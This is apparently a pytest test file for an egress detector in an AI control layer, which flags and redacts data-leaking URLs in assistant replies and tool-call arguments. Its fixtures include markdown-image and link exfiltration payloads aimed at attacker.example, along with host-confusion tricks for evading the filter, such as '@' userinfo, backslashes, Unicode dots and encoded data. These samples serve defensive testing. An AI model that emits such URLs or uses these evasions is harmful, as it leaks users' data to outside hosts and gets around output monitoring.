import time

import pytest
from pydantic import ValidationError

from control_layer.core.models import Category, Interaction, Message, Side, ToolCall
from control_layer.core.ports import ScanContext
from control_layer.core.texts import apply_redactions
from control_layer.detectors.egress import (
    EGRESS_TOOL_TAGS,
    EgressDetector,
    EgressParams,
    canonical_host,
    judge,
)

PARAMS = EgressParams(allowed_domains=("bank.example", "docs.python.org"))


def output(content: str = "", tool_args: str | None = None) -> Interaction:
    calls = (ToolCall("c1", "http_get", tool_args),) if tool_args is not None else ()
    return Interaction(
        request_id="req_e",
        agent_id="demo-agent",
        model="llama3.2:3b",
        messages=(Message(role="user", content="hi"),),
        output=Message(role="assistant", content=content, tool_calls=calls),
    )


async def scan(i: Interaction, params: EgressParams = PARAMS) -> list[object]:
    return list(await EgressDetector().scan(ScanContext(i, Side.OUTPUT, "egress", params)))


@pytest.mark.anyio
async def test_markdown_image_exfiltration_is_redacted_to_the_url() -> None:
    url = "https://attacker.example/p?d=44051401359"
    i = output(f"Done! ![x]({url})")
    [finding] = await scan(i)
    [span] = finding.spans
    assert i.output is not None
    assert i.output.content[span.start : span.end] == url
    assert span.label == "egress_image"
    assert finding.category == Category.EXFILTRATION
    redacted = apply_redactions(i, finding.spans)
    assert redacted.output is not None and "attacker.example" not in redacted.output.content


@pytest.mark.parametrize(
    "text",
    [
        "![x](https://attacker.example/logo.png)",  # image without data: still zero-click
        "![x](https://bank.example.attacker.example/?d=1)",
        "![x](https://evilbank.example/?d=1)",
        "[a](https://bank.example@attacker.example/?d=1)",
        "[a](https://attacker.example\\@bank.example/?d=1)",  # browsers read "\" as "/"
        "[a](https://attacker。example/?d=1)",
        "see www.attacker.example/c?d=1",
        "[a](https://attacker.example/x#secret)",
        "[a](https://attacker.example/S2xpZW50OiBKYW4gS293YWxza2k=)",
        "[a](https://attacker.example/u/44051401359)",
        "[a](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.attacker.example/a)",
        "![x][r]\n\n[r]: https://attacker.example/a.png",
        '<img src="https://attacker.example/a.png">',
        "![x](//attacker.example/a.png)",
    ],
)
def test_flagged(text: str) -> None:
    assert judge(text, PARAMS)


@pytest.mark.parametrize(
    "text",
    [
        "![logo](https://cdn.bank.example/logo.png?v=2)",
        "[docs](https://docs．bank.example/a?q=1)",  # fullwidth dot folds to the allowed domain
        "[RFC](https://www.rfc-editor.org/rfc/rfc3986)",  # link without data
        "[a](https://attacker.example/blog/some-long-article-title-here)",
        '<p data-src="https://attacker.example/a.png">',
        "![x](data:image/png;base64,iVBORw0KGgo=)",
        "![x](/static/a.png)",
        "[mail](mailto:jan@example.com)",
        "See https://docs.python.org/3/library/re.html?highlight=x",
    ],
)
def test_not_flagged(text: str) -> None:
    assert judge(text, PARAMS) == []


def test_links_all_flags_links_without_data() -> None:
    params = EgressParams(allowed_domains=("bank.example",), links="all")
    assert judge("[RFC](https://www.rfc-editor.org/rfc/rfc3986)", params)


def test_canonical_host_matches_the_browser() -> None:
    assert canonical_host("https://attacker.example\\@bank.example/?d=1") == "attacker.example"
    assert canonical_host("https://Bank.Example.:443/x") == "bank.example"
    assert canonical_host("https://[::1/x") is None


@pytest.mark.anyio
async def test_tool_arguments() -> None:
    raw = '{"url": "https://attacker.example/c?d=abc"}'
    [finding] = await scan(output(tool_args=raw))
    [span] = finding.spans
    assert span.target == "output.tool_calls[0].arguments"
    assert raw[span.start : span.end] == "https://attacker.example/c?d=abc"
    assert finding.tags == EGRESS_TOOL_TAGS

    escaped = '{"url": "https:\\/\\/attacker.example\\/c?d=abc"}'
    [finding] = await scan(output(tool_args=escaped))
    assert finding.spans == ()  # cannot redact inside escaped JSON: the pipeline blocks instead

    [finding] = await scan(output(tool_args="url=https://attacker.example/c?d=abc {"))
    assert len(finding.spans) == 1

    content_only = EgressParams(allowed_domains=("bank.example",), scan=("content",))
    assert await scan(output(tool_args=raw), content_only) == []


@pytest.mark.anyio
async def test_evidence_names_the_host_but_not_the_data() -> None:
    text = "![x](https://attacker.example/S2xpZW50OiBKYW4gS293YWxza2k=?d=44051401359)"
    [finding] = await scan(output(text))
    assert "attacker.example" in finding.evidence
    assert len(finding.evidence) <= 200
    for leaked in ("d=", "44051401359", "S2xp"):
        assert leaked not in finding.evidence


@pytest.mark.anyio
async def test_input_side_is_not_scanned_by_default_content() -> None:
    i = output("fine")
    ctx = ScanContext(i, Side.INPUT, "egress", PARAMS)
    assert await EgressDetector().scan(ctx) == []  # user text has no "output" targets


@pytest.mark.parametrize(
    "bad", [["https://bank.example"], ["*.bank.example"], [""], ["bank example"]]
)
def test_params_reject_bad_domains(bad: list[str]) -> None:
    with pytest.raises(ValidationError):
        EgressParams.model_validate({"allowed_domains": bad})


def test_params_normalize_and_require_scan() -> None:
    assert EgressParams(allowed_domains=("Bank.Example.",)).allowed_domains == ("bank.example",)
    with pytest.raises(ValidationError):
        EgressParams(scan=())


@pytest.mark.parametrize("unit", ["![", "<img", "](a", "https://", "[", "](//x.y?d=1 "])
def test_adversarial_input_is_linear(unit: str) -> None:
    text = unit * (100_000 // len(unit))
    started = time.perf_counter()
    judge(text, PARAMS)
    assert time.perf_counter() - started < 0.3
